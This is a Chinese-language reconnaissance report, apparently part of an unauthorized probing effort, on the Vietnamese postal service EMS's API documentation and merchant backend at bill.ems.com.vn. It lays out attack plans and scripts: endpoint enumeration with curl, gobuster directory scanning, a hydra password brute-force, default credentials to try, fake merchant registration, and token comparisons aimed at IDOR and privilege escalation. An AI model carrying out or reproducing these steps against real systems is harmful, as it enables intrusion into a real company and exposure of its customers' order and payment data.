# 🔥 EMS官方API文档发现

## 核心发现

**发现了EMS的官方API文档站点！**

```
文档地址: https://docws.ems.com.vn
后台系统: https://bill.ems.com.vn
```

---

## 📚 官方API文档

### 1. 文档入口

| 资源 | URL | 说明 |
|------|-----|------|
| **主文档** | https://docws.ems.com.vn | 官方API文档首页 |
| **认证文档** | https://docws.ems.com.vn/tieng-viet/authentication | Token认证说明 |
| **Token注册** | https://docws.ems.com.vn/tieng-viet/authentication/dang-ky-token | 如何获取API Token |
| **后台系统** | https://bill.ems.com.vn/login | 商户管理后台 |

### 2. 获取Token的官方方法

根据官方文档 (dang-ky-token.md):

```markdown
# Đăng ký Token (注册Token)

步骤:
1. 登录系统: https://bill.ems.com.vn/login
2. 访问并选择"创建Key"
3. 成功创建API KEY
```

**这意味着:**
- ✅ 有官方的商户后台系统
- ✅ 商户可以自己生成API Token
- ✅ Token用于调用MCS APIs (MerchantSite APIs)

---

## 🎯 官方API系统 vs 移动端App

### 对比

| 特性 | 官方API (MCS) | 移动端App |
|------|--------------|-----------|
| 目标用户 | 商户/合作伙伴 | 普通用户 |
| Token获取 | bill.ems.com.vn后台 | 注册登录 |
| API域名 | 可能不同？ | ws.ems.com.vn |
| 认证方式 | API Token | Bearer Token |
| 用途 | 批量下单/查询 | 单个订单 |

### 关键问题

**Q: 官方API和移动端API是同一个吗？**

可能情况:
1. **同一个后端**: 只是Token类型不同
2. **不同后端**: 商户API功能更强大
3. **权限不同**: 商户API可能有更高权限

---

## 🔍 需要深入探测

### 1. bill.ems.com.vn 系统

```bash
# 探测后台系统
curl "https://bill.ems.com.vn/login"

# 可能的API端点
curl "https://bill.ems.com.vn/api/v1/..."
```

**这个系统可能:**
- 商户注册/登录
- 生成API Token
- 管理订单
- 可能暴露敏感功能

### 2. 官方API文档详情

已下载文档:
- `doc_tieng-viet.md` - 越南语文档首页
- `doc_tieng-viet_gioi-thieu.md` - 介绍文档
- `doc_tieng-viet_authentication.md` - 认证文档
- `doc_tieng-viet_authentication_dang-ky-token.md` - Token注册

**需要探测的文档:**
- `/tieng-viet/diem-gui-hang` (取件点)
- `/tieng-viet/buu-gui` (邮寄)
- `/tieng-viet/webhook` (Webhook)
- `/tieng-viet/danh-muc` (目录)

### 3. API端点差异

移动端API (已知):
```
http://ws.ems.com.vn/api/v1/orders/list
http://ws.ems.com.vn/api/v1/orders/tracking/{id}
http://ws.ems.com.vn/api/v1/auth/login
```

官方API (未知):
```
可能的域名:
  • https://api.ems.com.vn
  • https://bill.ems.com.vn/api
  • https://ws.ems.com.vn/merchant-api
  • https://mcs.ems.com.vn
```

---

## 💥 潜在新攻击面

### 1. bill.ems.com.vn 商户后台

**可能存在的漏洞:**

```
• 商户注册 - 弱验证
• Token生成 - 可预测
• 权限提升 - 普通用户 → 商户
• 信息泄露 - 所有商户数据
• IDOR - 访问其他商户的Token/订单
```

**测试方法:**
```bash
# 1. 探测注册端点
curl "https://bill.ems.com.vn/api/register" -d "..."

# 2. 弱密码爆破
hydra -l admin -P passwords.txt https://bill.ems.com.vn

# 3. 默认凭证
admin:admin
merchant:123456
test:test123
```

### 2. 官方API功能

**如果能获取商户Token:**

```python
# 商户API可能有的功能
endpoints = [
    "/api/v1/merchant/orders/all",      # 所有订单
    "/api/v1/merchant/customers",       # 所有客户
    "/api/v1/merchant/statistics",      # 统计数据
    "/api/v1/merchant/payments",        # 支付信息
    "/api/v1/merchant/invoices",        # 发票
    "/api/v1/webhook/configure",        # Webhook配置
]

# 权限可能更高
# 数据量可能更大
# 功能可能更敏感
```

### 3. Webhook滥用

文档中提到Webhook:

```
可能的攻击:
  • Webhook URL注入
  • SSRF (服务器端请求伪造)
  • 数据泄露 (订单推送到攻击者服务器)
  • DoS (Webhook轰炸)
```

---

## 🛠️ 立即行动

### 步骤1: 深度探测 bill.ems.com.vn

```bash
#!/bin/bash
# bill.ems.com.vn深度探测

echo "=== EMS商户后台探测 ==="

# 1. 页面分析
curl -s "https://bill.ems.com.vn/login" > bill_login.html
cat bill_login.html | grep -i "api\|endpoint\|action"

# 2. JS文件分析
curl -s "https://bill.ems.com.vn" | grep -oP 'src="[^"]*\.js"' | while read js; do
    echo "[*] 下载: $js"
    curl -s "https://bill.ems.com.vn$js" > "bill_$(basename $js)"
done

# 3. API端点发现
for endpoint in register forgot-password api/token api/user api/orders; do
    echo "[*] 测试: $endpoint"
    curl -I "https://bill.ems.com.vn/$endpoint" 2>&1 | head -1
done

# 4. 目录扫描
gobuster dir -u https://bill.ems.com.vn -w wordlist.txt -t 50
```

### 步骤2: 下载完整API文档

```bash
# 下载所有API文档页面
python3 << 'EOF'
import requests

base = "https://docws.ems.com.vn"

pages = [
    "/tieng-viet/gioi-thieu",
    "/tieng-viet/authentication",
    "/tieng-viet/authentication/dang-ky-token",
    "/tieng-viet/diem-gui-hang",
    "/tieng-viet/buu-gui",
    "/tieng-viet/webhook",
    "/tieng-viet/danh-muc",
]

for page in pages:
    r = requests.get(base + page + ".md")
    if r.status_code == 200:
        filename = page.replace('/', '_') + '.md'
        with open(filename, 'w') as f:
            f.write(r.text)
        print(f"[+] {filename}")
EOF
```

### 步骤3: 尝试注册商户账号

```bash
# 如果能注册商户账号，就能生成官方API Token

# 方法1: Web注册
# 访问 https://bill.ems.com.vn/register

# 方法2: API注册
curl "https://bill.ems.com.vn/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "company": "Test Company",
    "email": "test@example.com",
    "phone": "0123456789",
    "password": "Test123456"
  }'

# 方法3: 测试默认商户账号
./test_default_merchants.py
```

### 步骤4: 对比两套API

```python
#!/usr/bin/env python3
"""
对比移动端API vs 官方API
"""

# 移动端Token
mobile_token = "MOBILE_TOKEN_HERE"

# 商户Token (如果获取到)
merchant_token = "MERCHANT_TOKEN_HERE"

# 测试相同端点
endpoint = "http://ws.ems.com.vn/api/v1/orders/list"

# 用移动端Token
r1 = requests.get(endpoint, headers={"Authorization": f"Bearer {mobile_token}"})

# 用商户Token
r2 = requests.get(endpoint, headers={"Authorization": f"Bearer {merchant_token}"})

# 对比结果
print("移动端Token:")
print(f"  订单数: {len(r1.json().get('data', []))}")

print("商户Token:")
print(f"  订单数: {len(r2.json().get('data', []))}")

# 如果商户Token返回更多数据 → 权限更高!
```

---

## 📊 总结

### 重大发现

1. **官方API文档**: https://docws.ems.com.vn
   - GitBook托管
   - 公开访问
   - 包含认证说明

2. **商户后台**: https://bill.ems.com.vn
   - 商户登录/注册
   - 生成API Token
   - **新的攻击面!**

3. **两套系统**:
   - 移动端: 普通用户
   - 商户端: 合作伙伴
   - 可能有权限差异

### 下一步行动

**优先级1: 探测 bill.ems.com.vn**
```
• 注册测试账号
• 生成商户Token
• 测试API权限
```

**优先级2: 下载完整文档**
```
• 所有API端点
• Webhook功能
• 数据模型
```

**优先级3: 对比分析**
```
• 移动端 vs 商户API
• Token权限差异
• 新的IDOR机会
```

---

生成日期: 2025-11-01

**这是一个重大发现! 官方商户系统可能有更高权限和更多敏感功能!**
